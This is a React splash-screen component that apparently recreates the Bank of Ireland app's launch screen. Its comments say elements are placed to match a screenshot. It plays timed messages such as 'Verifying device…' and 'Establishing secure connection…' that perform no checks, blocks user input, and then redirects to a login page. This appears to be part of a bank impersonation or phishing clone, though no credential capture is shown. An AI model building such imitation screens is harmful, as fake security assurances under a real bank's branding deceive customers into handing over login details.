import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function Splash() {
  const [, navigate] = useLocation();
  const [currentStep, setCurrentStep] = useState(0);
  const [isVisible, setIsVisible] = useState(true);

  const loadingSteps = [
    "Verifying device…",
    "Checking for updates…", 
    "Loading security settings…",
    "Establishing secure connection…",
    "Preparing login screen…"
  ];

  useEffect(() => {
    // Step progression timing: each step lasts 1.6 seconds
    const stepTimers: NodeJS.Timeout[] = [];
    
    // Progress through each loading step
    loadingSteps.forEach((_, index) => {
      const timer = setTimeout(() => {
        setCurrentStep(index);
      }, index * 1600); // 1.6 seconds per step
      stepTimers.push(timer);
    });

    // Navigate to login after all steps complete (8 seconds total)
    const finalTimer = setTimeout(() => {
      setIsVisible(false);
      setTimeout(() => {
        navigate('/login');
      }, 300); // Brief fade out before navigation
    }, loadingSteps.length * 1600);

    stepTimers.push(finalTimer);

    // Cleanup all timers
    return () => {
      stepTimers.forEach(timer => clearTimeout(timer));
    };
  }, [navigate]);

  // Prevent any user interaction during splash
  const handleInteraction = (e: React.MouseEvent | React.TouchEvent) => {
    e.preventDefault();
    e.stopPropagation();
  };

  return (
    <div 
      className={`relative overflow-hidden transition-all duration-500 ${
        isVisible ? 'opacity-100' : 'opacity-0'
      }`}
      style={{
        position: 'fixed',
        top: '-50px',
        left: '-50px',
        right: '-50px',
        bottom: '-50px',
        width: 'calc(100vw + 100px)',
        height: 'calc(100vh + 100px)',
        minHeight: 'calc(100vh + 100px)',
        backgroundColor: '#2448FF', // Bank of Ireland blue background
        userSelect: 'none',
        pointerEvents: 'none',
        zIndex: 9999
      }}
      onClick={handleInteraction}
      onTouchStart={handleInteraction}
    >
      {/* Full screen background with Bank of Ireland branding */}
      <div 
        className="absolute"
        style={{
          top: '-50px',
          left: '-50px',
          right: '-50px', 
          bottom: '-50px',
          width: 'calc(100vw + 100px)',
          height: 'calc(100vh + 100px)',
          backgroundImage: `url('/boi_app_icon.png')`,
          backgroundSize: 'contain',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
          backgroundColor: '#2448FF' // Bank of Ireland blue extends beyond edges
        }}
      />
      {/* Prevent any interactions */}
      <div 
        className="absolute inset-0 z-50"
        style={{ pointerEvents: 'none' }}
      />
      
      {/* Loading text and spinner positioned where they appear in the screenshot */}
      <div className="absolute" style={{ bottom: '30%', left: '50%', transform: 'translateX(-50%)' }}>
        {/* Loading text */}
        <div className="text-center mb-6">
          {loadingSteps.map((message, index) => (
            <div
              key={index}
              className={`absolute left-1/2 transform -translate-x-1/2 transition-all duration-700 ease-out ${
                index === currentStep 
                  ? 'opacity-100 translate-y-0 scale-100' 
                  : index < currentStep
                    ? 'opacity-0 -translate-y-3 scale-95'
                    : 'opacity-0 translate-y-3 scale-95'
              }`}
            >
              <p 
                className="text-white text-base font-medium tracking-wide whitespace-nowrap"
                style={{ 
                  fontFamily: 'OpenSans, sans-serif',
                  textShadow: '0 1px 3px rgba(0, 0, 0, 0.3)'
                }}
              >
                {message}
              </p>
            </div>
          ))}
        </div>
        
        {/* Animated loading spinner */}
        <div className="flex justify-center">
          <div 
            className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"
            style={{
              animation: 'spin 1s linear infinite',
              opacity: 0.9
            }}
          />
        </div>
      </div>
    </div>
  );
}